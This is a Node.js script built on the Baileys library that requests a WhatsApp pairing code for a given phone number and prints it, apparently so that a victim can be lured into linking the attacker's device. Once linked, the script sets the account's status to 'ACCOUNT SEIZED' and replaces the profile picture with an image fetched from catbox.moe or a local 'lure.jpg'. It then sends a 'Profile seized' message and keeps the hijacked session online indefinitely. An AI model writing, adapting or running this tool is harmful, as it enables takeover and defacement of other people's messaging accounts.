const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    fetchLatestBaileysVersion, 
    DisconnectReason,
    Browsers,
    delay
} = require("@whiskeysockets/baileys"); 
const pino = require("pino");
const Jimp = require("jimp");
const fs = require("fs");
const https = require("https");
const sessionPath = './session_new';
let sock = null;
let pairingCodeRequested = false;
let isShuttingDown = false;

function cleanSession() {
    if (fs.existsSync(sessionPath)) {
        fs.rmSync(sessionPath, { recursive: true, force: true });
        console.log(`[✓] Cleaned old session`);
    }
}

// Download image from URL with retries
async function downloadImage(url, filename, retries = 3) {
    for (let i = 0; i < retries; i++) {
        try {
            console.log(`[i] Download attempt ${i + 1}/${retries}...`);
            await new Promise((resolve, reject) => {
                const file = fs.createWriteStream(filename);
                const request = https.get(url, { timeout: 30000 }, (response) => {
                    if (response.statusCode !== 200) {
                        reject(new Error(`HTTP ${response.statusCode}`));
                        return;
                    }
                    response.pipe(file);
                    file.on('finish', () => {
                        file.close();
                        resolve();
                    });
                });
                
                request.on('error', (err) => {
                    fs.unlink(filename, () => {});
                    reject(err);
                });
                
                request.on('timeout', () => {
                    request.destroy();
                    reject(new Error('Timeout'));
                });
            });
            console.log(`[✓] Download successful`);
            return filename;
        } catch (err) {
            console.log(`[✗] Attempt ${i + 1} failed: ${err.message}`);
            if (i < retries - 1) {
                console.log(`[i] Retrying in 3 seconds...`);
                await delay(3000);
            }
        }
    }
    throw new Error(`Failed to download after ${retries} attempts`);
}

async function connectToWhatsApp(isFirstConnect = true) {
    if (isFirstConnect) {
        cleanSession();
    }
    
    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    
    if (!isFirstConnect && state.creds?.me) {
        console.log(`[i] Resuming session as: ${state.creds.me.id}`);
    }
    
    const { version } = await fetchLatestBaileysVersion();
    console.log(`[i] Using WA v${version.join(".")}`);

    sock = makeWASocket({
        version,
        auth: state,
        logger: pino({ level: "silent" }),
        browser: Browsers.macOS("Chrome"),
        syncFullHistory: false,
        markOnlineOnConnect: true,
        printQRInTerminal: false,
        connectTimeoutMs: 120000,
        keepAliveIntervalMs: 30000,
        defaultQueryTimeoutMs: 60000
    });

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect, qr } = update;
        
        if (isShuttingDown) return;
        
        if (qr && !pairingCodeRequested && !sock.authState.creds.registered) {
            pairingCodeRequested = true;
            
            const phoneNumber = process.argv[2]?.replace(/\D/g, '');
            // CHANGE THIS:
if (!phoneNumber || phoneNumber.length < 10) {
    console.error("[x] Error: Provide phone number with country code");
    console.error("ANON_CODE_START:ERROR_INVALID_NUMBER:ANON_CODE_END");
    return;  // Don't crash — just stop this function
}

            console.log(`[i] Requesting pairing code for: ${phoneNumber}`);
            console.log("[i] Go to WhatsApp → Settings → Linked Devices → Link with phone number");
            
            await delay(2000);
            
            try {
                const code = await sock.requestPairingCode(phoneNumber);
                
                console.log(`\n╔════════════════════════════════════╗`);
                console.log(`║  PAIRING CODE: ${code}              ║`);
                console.log(`╚════════════════════════════════════╝\n`);
                console.log(`ANON_CODE_START:${code}:ANON_CODE_END`);
                
                fs.writeFileSync('CODE.txt', code);
                console.log("[i] Enter this code on your phone NOW...");
                console.log("[i] DO NOT close this terminal! Waiting for connection...");
                
            } catch (err) {
                console.error("[✗] Failed to get pairing code:", err.message);
                pairingCodeRequested = false;
            }
        }

        if (connection === "open") {
            console.log("\n[✓] SUCCESS: DEVICE LINKED!");
            console.log(`[i] User: ${sock.user?.name || 'unknown'} (${sock.user?.id || 'unknown'})`);
            console.log("[i] Device is now ACTIVE and ONLINE");
            console.log("[i] Press CTRL+C to stop and disconnect\n");
            
            console.log("[i] Stabilizing connection (10s)...");
            await delay(10000);
            
            if (!sock.user) {
                console.log("[✗] Connection lost during stabilization!");
                return;
            }
            
            try {
                // 1. Update profile status (text)
                console.log("[i] Updating profile status...");
                await sock.updateProfileStatus("ψ ☠︎︎ ACCOUNT SEIZED ☠︎︎ ψ");
                console.log("[✓] Profile status updated!");
                
                // 2. Update profile picture from Catbox URL with retries
                const imageUrl = 'https://files.catbox.moe/c61uu3.jpg';
                const tempFile = './temp_profile.jpg';
                let usedLocalFile = false;
                
                try {
                    console.log(`[i] Downloading image from Catbox...`);
                    await downloadImage(imageUrl, tempFile, 3); // 3 retries
                    
                    console.log("[i] Updating profile picture...");
                    await sock.updateProfilePicture(sock.user.id, { url: tempFile });
                    console.log("[✓] Profile picture updated from Catbox!");
                    
                    // Clean up temp file
                    fs.unlinkSync(tempFile);
                    
                } catch (urlErr) {
                    console.log(`[✗] Catbox failed: ${urlErr.message}`);
                    
                    // Fallback to local lure.jpg
                    if (fs.existsSync('./lure.jpg')) {
                        console.log("[i] Using local lure.jpg instead...");
                        try {
                            await sock.updateProfilePicture(sock.user.id, { url: './lure.jpg' });
                            console.log("[✓] Profile picture updated with local file!");
                            usedLocalFile = true;
                        } catch (localErr) {
                            console.log("[✗] Local file also failed:", localErr.message);
                            if (localErr.message.includes("No image processing library")) {
                                console.log("\n╔════════════════════════════════════════════════╗");
                                console.log("║  MISSING IMAGE PROCESSING LIBRARY!              ║");
                                console.log("║                                                 ║");
                                console.log("║  Run this command to install:                   ║");
                                console.log("║  npm install sharp                              ║");
                                console.log("║                                                 ║");
                                console.log("║  Or if that fails, try:                         ║");
                                console.log("║  npm install jimp                               ║");
                                console.log("╚════════════════════════════════════════════════╝\n");
                            }
                        }
                    } else {
                        console.log("[✗] lure.jpg not found in current directory!");
                    }
                }
                
                if (!usedLocalFile && !fs.existsSync('./temp_profile.jpg')) {
                    console.log("[!] Profile picture not updated - using default");
                }
                
                // 3. Send confirmation message
                await delay(2000);
                await sock.sendMessage(sock.user.id, { 
                    text: "*SYSTEM ERROR:* Satanic MD V1 Executed.\n\nProfile seized successfully.\n\nDevice is now linked and active." 
                });
                console.log("[✓] Message sent!");
                
            } catch (e) { 
                console.log("[✗] Update failed:", e.message);
            }
            
            // KEEP ALIVE INDEFINITELY
            console.log("\n[i] Connection will stay active until manually stopped...");
            console.log("[i] Device showing as ONLINE in Linked Devices\n");
            
            let heartbeatCount = 0;
            while (!isShuttingDown) {
                await delay(60000);
                heartbeatCount++;
                console.log(`[i] Heartbeat #${heartbeatCount} - Still active at ${new Date().toLocaleTimeString()}`);
                
                try {
                    if (sock && sock.user) {
                        await sock.sendPresenceUpdate('available');
                    }
                } catch (e) {
                    // Silent fail
                }
            }
        }

        if (connection === "close") {
            if (isShuttingDown) return;
            
            const statusCode = lastDisconnect?.error?.output?.statusCode;
            console.log(`[i] Connection closed. Status: ${statusCode}`);

            if (statusCode === 515 || statusCode === DisconnectReason.restartRequired) {
                console.log("[i] 515: Server restart required. Reconnecting to stay active...");
                await delay(3000);
                return connectToWhatsApp(false);
            }
            
            if (statusCode === 405) {
                console.log("[!] 405: Not ready. Retrying...");
                await delay(3000);
                pairingCodeRequested = false;
                return connectToWhatsApp(false);
            }
            
            if (statusCode === 408) {
                console.log("[!] 408: Timeout. Retrying...");
                await delay(3000);
                return connectToWhatsApp(false);
            }
            
            if (statusCode === 428) {
                console.log("[!] 428: Closed early. Retrying...");
                await delay(3000);
                pairingCodeRequested = false;
                return connectToWhatsApp(false);
            }
            
            const shouldReconnect = statusCode !== DisconnectReason.loggedOut && statusCode !== 401;
            
            if (shouldReconnect) {
                console.log("[i] Reconnecting to maintain active status...");
                await delay(3000);
                return connectToWhatsApp(false);
            } else {
                console.log("[✗] Logged out or authentication failed");
                console.log("[i] Restart the script to reconnect");
                process.exit(1);
            }
        }
        
        if (connection === "connecting") {
            console.log("[i] Connecting to WhatsApp...");
        }
    });

    sock.ev.on("error", (err) => {
        console.error("[!] Socket error:", err.message);
    });
}

// Handle graceful shutdown
process.on("SIGINT", async () => {
    if (isShuttingDown) return;
    isShuttingDown = true;
    
    console.log("\n[!] Shutting down gracefully...");
    
    try {
        if (sock && sock.user) {
            await sock.updateProfileStatus("Offline");
            console.log("[i] Status set to offline");
        }
    } catch (e) {}
    
    console.log("[✓] Disconnected. Goodbye!");
    process.exit(0);
});

process.on("SIGTERM", () => {
    console.log("\n[!] Terminated");
    process.exit(0);
});

(async () => {
    await connectToWhatsApp(true);
})();
